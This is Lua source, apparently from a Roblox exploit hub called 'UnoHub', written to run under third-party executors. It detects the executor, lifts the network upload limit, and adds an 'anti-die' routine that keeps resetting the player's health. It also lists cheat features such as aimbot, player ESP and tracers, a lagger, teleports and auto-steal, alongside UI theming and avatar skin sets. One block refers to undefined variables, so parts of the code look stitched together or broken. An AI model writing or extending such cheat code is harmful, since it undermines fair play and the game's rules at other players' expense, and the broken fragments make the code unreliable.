if not LPH_OBFUSCATED then
	LPH_NO_VIRTUALIZE = function(callback)
	return callback
	end
	end

	;LPH_NO_VIRTUALIZE(function()

	do
	local scriptEnv = _G
	pcall(function()
	if type(getfenv) == "function" then scriptEnv = getfenv(0) end
	end)
	local sharedEnv = scriptEnv
	pcall(function()
	if type(getgenv) == "function" then sharedEnv = getgenv() end
	end)
	if type(scriptEnv) ~= "table" then scriptEnv = _G end
	if type(sharedEnv) ~= "table" then sharedEnv = scriptEnv end

	local hiddenSetter = rawget(scriptEnv, "sethiddenproperty")
	or rawget(sharedEnv, "sethiddenproperty")
	or rawget(scriptEnv, "set_hidden_property")
	or rawget(sharedEnv, "set_hidden_property")
	or rawget(scriptEnv, "sethiddenprop")
	or rawget(sharedEnv, "sethiddenprop")
	local synApi = rawget(scriptEnv, "syn") or rawget(sharedEnv, "syn")
	if type(hiddenSetter) ~= "function" and type(synApi) == "table" then
	hiddenSetter = rawget(synApi, "sethiddenproperty") or rawget(synApi, "set_hidden_property")
	end
	if type(hiddenSetter) == "function" then
	pcall(function() rawset(scriptEnv, "sethiddenproperty", hiddenSetter) end)
	pcall(function() rawset(sharedEnv, "sethiddenproperty", hiddenSetter) end)
	end

	local fpsCapSetter = rawget(scriptEnv, "setfpscap")
	or rawget(sharedEnv, "setfpscap")
	or rawget(scriptEnv, "set_fps_cap")
	or rawget(sharedEnv, "set_fps_cap")
	or rawget(scriptEnv, "setfpslimit")
	or rawget(sharedEnv, "setfpslimit")
	if type(fpsCapSetter) ~= "function" and type(synApi) == "table" then
	fpsCapSetter = rawget(synApi, "setfpscap") or rawget(synApi, "set_fps_cap")
	end
	if type(fpsCapSetter) == "function" then pcall(fpsCapSetter, 9999) end
	end

	local Players, UserInputService, TweenService, RunService, ReplicatedStorage,
	Lighting, HttpService, Player, isMobile = (function()
	local players = game:GetService("Players")
	local input = game:GetService("UserInputService")

	local mobile = input.TouchEnabled
	pcall(function()
	local platform = input:GetPlatform()
	mobile = input.TouchEnabled and (
	platform == Enum.Platform.Android
	or platform == Enum.Platform.IOS
	or not input.MouseEnabled
	)
	end)

	return players,
	input,
	game:GetService("TweenService"),
	game:GetService("RunService"),
	game:GetService("ReplicatedStorage"),
	game:GetService("Lighting"),
	game:GetService("HttpService"),
	players.LocalPlayer,
	mobile
	end)()

	local executorName = "unknown"
	do
	local executorEnv = _G
	pcall(function()
	if type(getgenv) == "function" then executorEnv = getgenv() end
	end)
	if type(executorEnv) ~= "table" then executorEnv = _G end
	local identify = rawget(executorEnv, "identifyexecutor")
	or rawget(executorEnv, "getexecutorname")
	or (type(_G) == "table" and (rawget(_G, "identifyexecutor") or rawget(_G, "getexecutorname")))
	if type(identify) == "function" then
	pcall(function()
	local name = identify()
	if name ~= nil then executorName = tostring(name) end
	end)
	end
	end
	local waveSafeMode = string.find(string.lower(executorName), "wave", 1, true) ~= nil
	_G.__UnoWaveSafeMode = waveSafeMode

	do
	local guiRootNames = {
	"Uno_Panel", "UnoHub", "UNO_Panel", "DashEffectGui", "UnoAutoGrabBar",
	"UnoLaggerGUI", "UnoMobileUI",
	"UnoEnemyWidget",
	}

	pcall(function()
	local oldLagger = _G.UnoLagger
	if oldLagger then
	if oldLagger.Stop then
	oldLagger.Stop()
	else
	if oldLagger.SetEnabled then oldLagger.SetEnabled(false) end
	if oldLagger.SetLowEndEnabled then oldLagger.SetLowEndEnabled(false) end
	end
	end
	end)
	if _G.__UNO_STATE then
	_G.__UNO_STATE.alive = false
	pcall(function()
	for _, stopper in ipairs(_G.__UNO_STATE.stoppers or {}) do pcall(stopper) end
	for _, conn in ipairs(_G.__UNO_STATE.conns or {}) do pcall(function() conn:Disconnect() end) end
	end)
	end
	_G.__UNO_STATE = nil
	_G.__UnoTrackConn = nil
	_G.__UnoTrackStopper = nil

	pcall(function()
	if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil end
	end)
	pcall(function() if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end end)

	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
	end)

	pcall(function()
	local coreGui = game:GetService("CoreGui")
	for _, container in ipairs({ coreGui, Player.PlayerGui }) do
	for _, name in ipairs(guiRootNames) do
	while true do
	local found = container:FindFirstChild(name)
	if not found then break end
	found:Destroy()
	end
	end
	end
	end)

	pcall(function()
	for _, plr in ipairs(Players:GetPlayers()) do
	local ch = plr.Character
	if ch then
	for _, part in ipairs(ch:GetChildren()) do
	for _, child in ipairs(part:GetChildren()) do
	if child.Name == "GreenDuelsBB" or child.Name == "Green22sBB" or child.Name == "22sSpeedBill" or child.Name == "22sHubOverhead" or child.Name == "UnoSpeedBill" or child.Name == "UnoHubOverhead"
	or child.Name == "UnoAimbotBodyLock" or child.Name == "UnoAimbotBodyAttachment"
	or child.Name == "UnoTPBatMarkerBodyLock" or child.Name == "UnoTPBatMarkerAttachment" then
	child:Destroy()
	end
	end
	end
	end
	end
	end)

	_G.__UNO_STATE = { conns = {}, stoppers = {}, alive = true }
	_G.__UnoTrackConn = function(conn)
	if conn then table.insert(_G.__UNO_STATE.conns, conn) end
	return conn
	end
	_G.__UnoTrackStopper = function(fn)
	if fn then table.insert(_G.__UNO_STATE.stoppers, fn) end
	end
	_G.__UnoResetHooks = {}
	_G.__UnoOnNewInstance = function(fn)
	if fn then table.insert(_G.__UnoResetHooks, fn) end
	end
	end
	local crystalRuntimeState = _G.__UNO_STATE

	do
	local traversalJobs = {}
	local traversalConnection = nil
	local function ensureTraversalRunner()
	if traversalConnection then return end
	traversalConnection = RunService.Heartbeat:Connect(function()
	local deadline = os.clock() + 0.0008
	while traversalJobs[1] and os.clock() < deadline do
	local job = traversalJobs[1]
	if job.cancelled or (job.continue and not job.continue()) then
	table.remove(traversalJobs, 1)
	else
	local object = job.pending[#job.pending]
	if not object then
	table.remove(traversalJobs, 1)
	else
	job.pending[#job.pending] = nil
	pcall(job.apply, object)
	local ok, children = pcall(function() return object:GetChildren() end)
	if ok then
	for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end
	end

	if traversalJobs[2] then
	table.remove(traversalJobs, 1)
	traversalJobs[#traversalJobs + 1] = job
	end
	end
	end
	end
	if not traversalJobs[1] then
	traversalConnection:Disconnect()
	traversalConnection = nil
	end
	end)
	_G.__UnoTrackConn(traversalConnection)
	end
	_G.__UnoWalkDescendantsBatched = function(roots, apply, shouldContinue)
	local job = { pending = {}, apply = apply, continue = shouldContinue, cancelled = false }
	if typeof(roots) == "Instance" then roots = { roots } end
	for _, root in ipairs(roots or {}) do
	if root then
	local ok, children = pcall(function() return root:GetChildren() end)
	if ok then for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end end
	end
	end
	traversalJobs[#traversalJobs + 1] = job
	ensureTraversalRunner()
	return function() job.cancelled = true end
	end
	_G.__UnoTrackStopper(function()
	for _, job in ipairs(traversalJobs) do job.cancelled = true end
	traversalJobs = {}
	if traversalConnection then traversalConnection:Disconnect(); traversalConnection = nil end
	end)
	end
	local CONFIG_FILE = "UnoHub_UI_Config.txt"

	do

	local antiDieEnabled = false
	local antiDieStopped = false
	_G.__UnoAntiDieGuiEnabled = nil
	local antiDieCharConns = {}
	local antiDieCharAddedConn = nil

	local function clearCharEntry(char, restore)
	local entry = antiDieCharConns[char]
	if entry then
	if entry.healthConn then pcall(function() entry.healthConn:Disconnect() end) end
	if entry.diedConn then pcall(function() entry.diedConn:Disconnect() end) end
	if entry.cleanupConn then pcall(function() entry.cleanupConn:Disconnect() end) end
	antiDieCharConns[char] = nil
	end
	if restore and char and char.Parent then
	pcall(function()
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
	hum.BreakJointsOnDeath = true
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
	end
	end)
	end
	end

	local function applyAntiDieToCharacter(char)
	if not char or not char.Parent then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	clearCharEntry(char, false)

	hum.BreakJointsOnDeath = false
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

	local entry = { humanoid = hum }
	entry.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
	if antiDieEnabled and antiDieCharConns[char] == entry and hum.Health <= 0 then
	hum.Health = hum.MaxHealth
	end
	end)

	entry.diedConn = hum.Died:Connect(function()
	task.defer(function()
	if antiDieEnabled and antiDieCharConns[char] == entry and hum and hum.Parent then
	hum.BreakJointsOnDeath = false
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	hum.Health = hum.MaxHealth
	end
	end)
	end)

	entry.cleanupConn = char.AncestryChanged:Connect(function()
	if not char.Parent then
	clearCharEntry(char, false)
	end
	end)

	antiDieCharConns[char] = entry
	end

	local function setAntiDieEnabled(enabled)
	enabled = enabled == true
	if enabled == antiDieEnabled then return end
	antiDieEnabled = enabled
	if enabled then
	if not antiDieCharAddedConn then
	antiDieCharAddedConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.2)
	if antiDieEnabled and char and char.Parent then
	applyAntiDieToCharacter(char)
	end
	end)
	end
	local char = Player.Character
	if char and char.Parent and not antiDieCharConns[char] then
	applyAntiDieToCharacter(char)
	end
	else
	for char in pairs(antiDieCharConns) do
	clearCharEntry(char, true)
	end
	end
	end

	local antiDieSources = { toggle = false, autobat = false }
	local function refreshAntiDie()
	if antiDieStopped then return end
	local manual = antiDieSources.toggle
	if _G.__UnoAntiDieGuiEnabled then manual = _G.__UnoAntiDieGuiEnabled() == true end
	setAntiDieEnabled(manual or antiDieSources.autobat)
	end

	_G.__UnoAntiDieSource = function(source, enabled)
	if antiDieStopped or antiDieSources[source] == nil then return end
	antiDieSources[source] = enabled == true
	refreshAntiDie()
	end

	_G.__UnoAntiDieSet = function(enabled)
	_G.__UnoAntiDieSource("autobat", enabled)
	end

	_G.__UnoAntiDieIsEnabled = function() return antiDieEnabled end

	_G.__UnoTrackStopper(function()
	antiDieStopped = true
	antiDieSources.toggle = false
	antiDieSources.autobat = false
	setAntiDieEnabled(false)
	end)
	local antiDieCharAddedTracked = false
	local _antiDieOrigSet = setAntiDieEnabled
	setAntiDieEnabled = function(enabled)
	_antiDieOrigSet(enabled)
	if antiDieCharAddedConn and not antiDieCharAddedTracked then
	antiDieCharAddedTracked = true
	_G.__UnoTrackConn(antiDieCharAddedConn)
	end
	end
	_G.__UnoTrackConn(RunService.Heartbeat:Connect(function()
	if antiDieStopped then return end
	refreshAntiDie()
	if not antiDieEnabled then return end
	local char = Player.Character
	local hum = char and char.Parent and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local entry = antiDieCharConns[char]

	if not entry or entry.humanoid ~= hum then applyAntiDieToCharacter(char) end
	if hum.BreakJointsOnDeath then hum.BreakJointsOnDeath = false end
	if hum:GetStateEnabled(Enum.HumanoidStateType.Dead) then
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	end
	if hum.Health <= 0 then hum.Health = hum.MaxHealth end
	end))
	end

	FeatureToggles = FeatureToggles or {}

	local toggleStates = {}
	local transientToggles = {
	["Aimbot"] = true,
	["Autoplay"] = true,
	["Lagger"] = true,
	}
	local mobileFeatures = {
	["Aimbot"] = true,
	["Drop"] = true,
	["TP Down"] = true,
	["Autoplay"] = true,
	["ESP Players"] = true,
	["Player Tracers"] = true,
	}
	local mobileShortcutStates = {}
	local mobileBtnPlaced = {}
	for featName, _ in pairs(mobileFeatures) do
	mobileShortcutStates[featName] = false
	mobileBtnPlaced[featName] = true
	end

	if featureName == "Toggle UI" then
	bindPill.Visible = true
	bindPill.Position = UDim2.new(1, -48, 0.5, -10)
	end
	local speedValues = {
	NormalBoost = 59,
	NormalSteal = 29,
	LaggerBoost = 40,
	LaggerSteal = 20,
	DesyncBoost = 59,
	DesyncSteal = 29,
	MobileButtonScale = 1.0,
	FOV = 90,
	StretchIntensity = 0.75,
	CypherAimbotApproachSpeed = 55,
	AutoTPDownHeight = 20,
	}
	local customSpeeds = {}
	local autoStealValues = {
	Radius      = 65,
	Duration    = 1.3,
	}
	local autoStealMode = "v1"
	local selectedMode = "Normal"
	local violetteSkinMode = "1"
	local batSkinMode = "Default"
	local batSkinModeLabels = { ["Default"] = "DEFAULT", ["Abyss Blue"] = "BLUE", ["Venom Green"] = "GREEN", ["Royal Gold"] = "GOLD", ["Velvet Rose"] = "ROSE", ["Crimson Night"] = "CRIMSON", ["RGB"] = "RGB" }
	local selectedIntroMusicIndex = 1
	local normalSpeed = 59
	local carrySpeed = 30
	local laggerSpeed = 40
	local speedToggled = false
	local carrySpeedMode = "v2"
	local laggerEnabled = false
	local lastMoveDir = Vector3.new(0, 0, 0)
	local MOVE_KEYS = {
	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
	}
	local _prevSpeed = false
	local FeatureKeybinds = {
	SelectNormalMode = nil,
	SelectLaggerMode = nil,
	Drop = nil,
	Autoplay = nil,
	["Toggle UI"] = nil,
	["Speed Boost"] = nil,
	["Aimbot"] = nil,
	["Carry Speed"] = nil,
	["TP Bat"] = Enum.KeyCode.P,

	FuckerToggle = nil,
	}
	local listeningBindBtn = nil
	local listeningFeature = nil
	local _allBindBtns = {}
	local _featureToggleMap = {}
	local toggleVisualUpdaters = {}
	local toggleStateSetters = {}
	local ragdollCounterPaused = false
	local FeaturePostToggle = FeaturePostToggle or {}
	local FPSLabel = nil
	local PingLabel = nil
	local StatsRightFps = nil
	local StatsRightPing = nil
	_G = _G or {}
	_G.__UnoDropMode = (_G.__UnoDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"
	_G["_UnoHub_UI_Data"] = _G["_UnoHub_UI_Data"] or {}
	local mobileButtonPositions = {}
	local quickButtonPositions = {}
	_G.__UnoButtonsSize = 1
	_G.__UnoGuiPositionResetters = {}
	_G.__UnoResetButtonPositions = nil
	_G.__UnoGuiPositionsReset = false
	_G.__UnoRoundPanelBackground = function(image, panel)
		local mask = Instance.new("CanvasGroup")
		mask.Name = "RoundedBackgroundMask"
		mask.Size = UDim2.fromScale(1, 1)
		mask.Position = UDim2.fromOffset(0, 0)
		mask.BackgroundTransparency = 1
		mask.BorderSizePixel = 0
		mask.GroupTransparency = 0
		mask.ZIndex = image.ZIndex
		mask.Parent = panel
		local panelCorner = panel:FindFirstChildOfClass("UICorner")
		local corner = Instance.new("UICorner", mask)
		corner.CornerRadius = panelCorner and panelCorner.CornerRadius or UDim.new(0, 16)
		local imageCorner = image:FindFirstChildOfClass("UICorner")
		if imageCorner then imageCorner:Destroy() end
		image.Parent = mask
	end
	_G.__UnoFramePanelBackground = function(image, index, panel)
		if not image then return end
		image.ScaleType = Enum.ScaleType.Crop
		local idx = tonumber(index) or 1
		-- Red theme: shift image more to the right in the panel
		if idx == 1 then
			image.Size = UDim2.new(1.28, 0, 1, 0)
			image.Position = UDim2.new(-0.22, 0, 0, 0)
		else
			image.Size = UDim2.fromScale(1, 1)
			image.Position = UDim2.fromScale(0, 0)
		end
	end
	_G.__UnoApplyMainBgFrame = function(image, index)
		pcall(_G.__UnoFramePanelBackground, image, index, nil)
	end

	_G.__UnoAddOriginalGui3Title = function(parent, panel)
	if parent then parent.Text = string.upper(tostring(panel or "H/YEJU")) end
	end

	local function clampOffsetsInsideViewport(scaleX, offsetX, scaleY, offsetY, width, height, sizeScale)
	local camera = workspace.CurrentCamera
	local vs = camera and camera.ViewportSize or Vector2.new(1920, 1080)
	if vs.X <= 0 or vs.Y <= 0 then return offsetX, offsetY end
	sizeScale = sizeScale or 1
	width = width * sizeScale
	height = height * sizeScale
	local minX = -vs.X * scaleX
	local maxX = vs.X * (1 - scaleX) - width
	local minY = -vs.Y * scaleY
	local maxY = vs.Y * (1 - scaleY) - height
	if maxX < minX then maxX = minX end
	if maxY < minY then maxY = minY end
	return math.clamp(offsetX, minX, maxX), math.clamp(offsetY, minY, maxY)
	end

	local function placeInsideViewport(gui, scaleX, offsetX, scaleY, offsetY, sizeScale)
	local width = gui.Size.X.Offset
	local height = gui.Size.Y.Offset
	local x, y = clampOffsetsInsideViewport(scaleX, offsetX, scaleY, offsetY, width, height, sizeScale)
	gui.Position = UDim2.new(scaleX, x, scaleY, y)
	return x, y
	end

	local isScrollDragging = false

	local function attachCleanHubTap(btn, onTap)
	return false
	end

	local cleanTapStates = setmetatable({}, { __mode = "k" })
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(inp)
	local states = cleanTapStates[inp]
	if not states then return end
	if inp.UserInputType ~= Enum.UserInputType.Touch and inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	for _, state in ipairs(states) do
	if (inp.Position - state.tapStart).Magnitude > 12 then state.tapMoved = true end
	end
	end)))
	_G.__UnoTrackConn(UserInputService.InputEnded:Connect(function(inp)
	local states = cleanTapStates[inp]
	if not states then return end
	cleanTapStates[inp] = nil
	for _, state in ipairs(states) do
	if not state.tapMoved and not isScrollDragging then
	local scrollMoved = state.scroll and state.scrollCanvasAtStart
	and math.abs(state.scroll.CanvasPosition.Y - state.scrollCanvasAtStart) > 5
	if not scrollMoved then state.callback() end
	end
	end
	end))

	local function connectBtn(btn, callback)
	if attachCleanHubTap(btn, callback) then return end
	btn.InputBegan:Connect(function(inp)
	if inp.UserInputType ~= Enum.UserInputType.Touch and inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	local activeScroll = Scroll
	local states = cleanTapStates[inp]
	if not states then states = {}; cleanTapStates[inp] = states end
	table.insert(states, {
	tapStart = inp.Position,
	tapMoved = false,
	scroll = activeScroll,
	scrollCanvasAtStart = activeScroll and activeScroll.CanvasPosition.Y or nil,
	callback = callback,
	})
	end)
	end

	local darkPalette = {
	["245,250,255"] = Color3.fromRGB(20, 38, 29),
	["235,245,255"] = Color3.fromRGB(24, 54, 38),
	["210,230,250"] = Color3.fromRGB(28, 68, 45),
	["190,220,250"] = Color3.fromRGB(35, 92, 57),
	["140,190,240"] = Color3.fromRGB(155, 38, 48),
	["80,160,255"] = Color3.fromRGB(190, 45, 55),
	["50,110,190"] = Color3.fromRGB(238, 205, 120),
	["80,130,200"] = Color3.fromRGB(245, 220, 155),
	["40,80,150"] = Color3.fromRGB(220, 185, 105),
	["30,90,200"] = Color3.fromRGB(180, 45, 54),
	["60,120,200"] = Color3.fromRGB(205, 55, 62),
	["100,140,200"] = Color3.fromRGB(235, 205, 135),
	}
	local GUI_WATCH_PROPERTIES = {"BackgroundColor3", "BorderColor3"}
	local TEXT_COLOR_PROPERTIES = {"BackgroundColor3", "TextColor3", "BorderColor3"}
	local TEXT_WATCH_PROPERTIES = {"TextColor3", "TextStrokeColor3", "TextStrokeTransparency"}
	local applyDarkPaletteTo
	local buttonThemeStates = setmetatable({}, {__mode = "k"})
	local function applyButtonTheme(instance)
	local owner = instance
	while owner and not owner:IsA("GuiButton") and not owner:GetAttribute("UnoButtonThemeControl") do
	owner = owner.Parent
	end
	if not owner then return end
	local property = instance:IsA("UIStroke") and "Color"
		or instance:IsA("UIGradient") and "Color"
		or instance:IsA("GuiObject") and "BackgroundColor3"
	if not property then return end
	local state = buttonThemeStates[instance]
	if not state then
	state = {}
	buttonThemeStates[instance] = state
	_G.__UnoTrackConn(instance:GetPropertyChangedSignal(property):Connect(function()
	applyButtonTheme(instance)
	end))
	end
	if state.busy then return end
	local current = instance[property]
	if current == state.applied and state.theme == _G.__UnoGuiTheme then return end
	if current ~= state.applied then state.original = current end
	local theme = _G.__UnoGuiTheme
	local function tint(color)
	if theme ~= "GUI 2" and theme ~= "GUI 3" then return color end
	local brightness = math.max(color.R, color.G, color.B)

	local dark = theme == "GUI 2" and Color3.fromRGB(8, 30, 19) or Color3.fromRGB(32, 9, 13)
	local bright = theme == "GUI 2" and Color3.fromRGB(204, 171, 91) or Color3.fromRGB(205, 48, 58)
	return dark:Lerp(bright, brightness)
	end
	local result = state.original
	if instance:IsA("UIGradient") then
	if theme == "GUI 2" or theme == "GUI 3" then
	local points = {}
	for _, point in ipairs(result.Keypoints) do
	table.insert(points, ColorSequenceKeypoint.new(point.Time, tint(point.Value)))
	end
	result = ColorSequence.new(points)
	end
	else
	result = tint(result)
	end
	state.applied = result
	state.theme = theme
	if current ~= result then
	state.busy = true
	instance[property] = result
	state.busy = false
	end
	end
	applyDarkPaletteTo = (function(instance)
	if not instance then return end
	local colorProperties = nil
	if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
	colorProperties = TEXT_COLOR_PROPERTIES
	elseif instance:IsA("GuiObject") then
	colorProperties = GUI_WATCH_PROPERTIES
	end
	if colorProperties then
	for _, property in ipairs(colorProperties) do
	local color = instance[property]
	local key = string.format("%d,%d,%d", math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5))
	if darkPalette[key] then instance[property] = darkPalette[key] end
	end
	end
	if instance:IsA("UIStroke") then
	local color = instance.Color
	local key = string.format("%d,%d,%d", math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5))
	if color.B > color.R + 12 and color.B >= color.G then instance.Color = Color3.fromRGB(0, 0, 0)
	elseif darkPalette[key] then instance.Color = darkPalette[key] end
	end

	if not _G.__UnoModernGuiActive and not instance:GetAttribute("UnoDarkPaletteWatched") then
	instance:SetAttribute("UnoDarkPaletteWatched", true)
	local function watchProperty(property)
	_G.__UnoTrackConn(instance:GetPropertyChangedSignal(property):Connect(function()
	applyDarkPaletteTo(instance)
	end))
	end
	if instance:IsA("UIStroke") then
	watchProperty("Color")
	elseif instance:IsA("GuiObject") then
	for _, property in ipairs(GUI_WATCH_PROPERTIES) do watchProperty(property) end
	if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
	for _, property in ipairs(TEXT_WATCH_PROPERTIES) do watchProperty(property) end
	end
	end
	end
	applyButtonTheme(instance)
	end)

	_G.__UnoThemeRoots = {}
	local themeWalkCancels = setmetatable({}, { __mode = "k" })
	_G.__UnoRegisterThemeRoot = (function(root)
	if not root then return end
	for _, savedRoot in ipairs(_G.__UnoThemeRoots) do
	if savedRoot == root then return end
	end
	table.insert(_G.__UnoThemeRoots, root)
	applyDarkPaletteTo(root)
	if themeWalkCancels[root] then themeWalkCancels[root]() end
	themeWalkCancels[root] = _G.__UnoWalkDescendantsBatched(root, applyDarkPaletteTo, function()
	return root.Parent ~= nil
	end)
	_G.__UnoTrackConn(root.DescendantAdded:Connect(applyDarkPaletteTo))
	end)
	_G.__UnoApplyTheme = (function()
	for _, root in ipairs(_G.__UnoThemeRoots) do
	if root and root.Parent then
	applyDarkPaletteTo(root)
	if themeWalkCancels[root] then themeWalkCancels[root]() end
	themeWalkCancels[root] = _G.__UnoWalkDescendantsBatched(root, applyDarkPaletteTo, function()
	return root.Parent ~= nil
	end)
	end
	end
	end)

_G.__UnoAddUnifiedPanelShade = function(parent, cornerRadius, zIndex)
	local oldShade = parent and parent:FindFirstChild("UnifiedBackgroundShade")
	if oldShade then oldShade:Destroy() end
	local oldOutline = parent and parent:FindFirstChild("UnifiedPanelWhiteOutline")
	if oldOutline then oldOutline:Destroy() end
	local oldGlow = parent and parent:FindFirstChild("UnifiedPanelWhiteGlow")
	if oldGlow then oldGlow:Destroy() end
	local shade = Instance.new("Frame")
	shade.Name = "UnifiedBackgroundShade"
	shade.Size = UDim2.fromScale(1, 1)
	shade.Position = UDim2.fromScale(0, 0)
	shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

	shade.BackgroundTransparency = 0.68
	shade.BorderSizePixel = 0
	shade.Active = false
	shade.ZIndex = zIndex or 1
	shade.Parent = parent
	Instance.new("UICorner", shade).CornerRadius = UDim.new(0, cornerRadius or 16)
	local shadeGradient = Instance.new("UIGradient", shade)
	shadeGradient.Rotation = 90
	shadeGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.28),
	NumberSequenceKeypoint.new(0.55, 0.42),
	NumberSequenceKeypoint.new(1, 0.56),
	})

	local outline = Instance.new("UIStroke")
	outline.Name = "UnifiedPanelWhiteOutline"
	outline.Color = Color3.fromRGB(255, 255, 255)
	outline.Thickness = 1.5
	outline.Transparency = 0.28
	outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	outline.LineJoinMode = Enum.LineJoinMode.Round
	outline.Parent = parent
	local outlineGradient = Instance.new("UIGradient", outline)
	outlineGradient.Rotation = 90
	outlineGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(165, 165, 165)),
	})
	local softGlow = Instance.new("UIStroke")
	softGlow.Name = "UnifiedPanelWhiteGlow"
	softGlow.Color = Color3.fromRGB(255, 255, 255)
	softGlow.Thickness = 4.5
	softGlow.Transparency = 0.72
	softGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	softGlow.LineJoinMode = Enum.LineJoinMode.Round
	softGlow.Parent = parent
	local glowGradient = Instance.new("UIGradient", softGlow)
	glowGradient.Rotation = 90
	glowGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.08),
	NumberSequenceKeypoint.new(0.55, 0.22),
	NumberSequenceKeypoint.new(1, 0.38),
	})
	return shade
end

	local gamepadInputTypes = {
	[Enum.UserInputType.Gamepad1] = true,
	[Enum.UserInputType.Gamepad2] = true,
	[Enum.UserInputType.Gamepad3] = true,
	[Enum.UserInputType.Gamepad4] = true,
	[Enum.UserInputType.Gamepad5] = true,
	[Enum.UserInputType.Gamepad6] = true,
	[Enum.UserInputType.Gamepad7] = true,
	[Enum.UserInputType.Gamepad8] = true,
	}

	local function isBindableInput(input)
	return input
	and input.KeyCode
	and input.KeyCode ~= Enum.KeyCode.Unknown
	and (input.UserInputType == Enum.UserInputType.Keyboard or gamepadInputTypes[input.UserInputType])
	end

	local function isClearKeybindInput(input)
	return input
	and input.UserInputType == Enum.UserInputType.Keyboard
	and input.KeyCode == Enum.KeyCode.RightControl
	end

	local mouseButtonMap = {}
	local mouseButtonDisplay = {
	["MB3"] = "Mouse3",
	}
	pcall(function() mouseButtonMap[Enum.UserInputType.MouseButton3] = "MB3" end)
	local function isMouseSideButton(input)
	return input and mouseButtonMap[input.UserInputType] ~= nil
	end
	local function getMouseButtonBind(input)
	return mouseButtonMap[input.UserInputType]
	end

	local function keybindDisplayName(key)
	if not key then return "-" end
	if type(key) == "string" then return mouseButtonDisplay[key] or key end
	return tostring(key):match("KeyCode%.(.+)") or tostring(key)
	end

	local VIOLETTE_SKIN_SETS = {
	    ["1"] = {
	        displayName = "1",
	        hats = "1744060292,439945661,1125510,1029025",
	        hair = "",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            1744060292,
	            439945661,
	            1125510,
	            1029025,
	            11748356,
	            8465506143,
	            11444217173,
	        },
	        clothing = {
	            7424637509,
	            7689651773,
	        },
	    
	    },
	    ["2"] = {
	        displayName = "2",
	        hats = "74891470",
	        hair = "16630147,6346833550,6594911228,6594919952,6823338112,7097747842",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            74891470,
	            16630147,
	            6346833550,
	            6594911228,
	            6594919952,
	            6823338112,
	            7097747842,
	        },
	        clothing = {
	            18423061209,
	            18423154566,
	        },
	    
	    },
	    ["3"] = {
	        displayName = "3",
	        hats = "215718515,439945661",
	        hair = "7183785281",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            215718515,
	            439945661,
	            7183785281,
	        },
	        clothing = {
	            15998365201,
	            7689651773,
	        },
	    
	    },
	    ["4"] = {
	        displayName = "4",
	        hats = "10159600649,439946249,17798262442,92482095662016",
	        hair = "139101716417676",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            10159600649,
	            439946249,
	            17798262442,
	            92482095662016,
	            139101716417676,
	            12490213797,
	        },
	        clothing = {
	            18766106994,
	            13925390578,
	        },
	    
	    },
	    ["5"] = {
	        displayName = "5",
	        hats = "553970961,1744060292",
	        hair = "93268856876777",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            553970961,
	            1744060292,
	            93268856876777,
	        },
	        clothing = {
	            9478068776,
	            6348682339,
	        },
	    
	    },
	    ["6"] = {
	        hats = "74891470,215718515,439945661,1016143686,1744060292,"
	            .. "10159600649,89012651581593,88365652378427",
	        hair = "126447390530523",
	        headless = true,
	        korblox = "Right",
	        accessories = {
	            74891470,
	            215718515,
	            439945661,
	            1016143686,
	            1744060292,
	            10159600649,
	            89012651581593,
	            126447390530523,
	        },
	        clothing = {
	            88032876921227,
	            108259950755140,
	        },
	        displayName = "6",
	    
	    },
	    ["7"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 9733132546, 101481154733615 },
	        displayName = "7",
	    
	    },
	    ["8"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 10796276786, 101481154733615 },
	        displayName = "8",
	    
	    },
	    ["9"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 8844377623, 101481154733615 },
	        displayName = "9",
	    
	    },
	    ["10"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 16107371158, 101481154733615 },
	        displayName = "10",
	    
	    },
	    ["11"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 15970848598, 101481154733615 },
	        displayName = "11",
	    
	    },
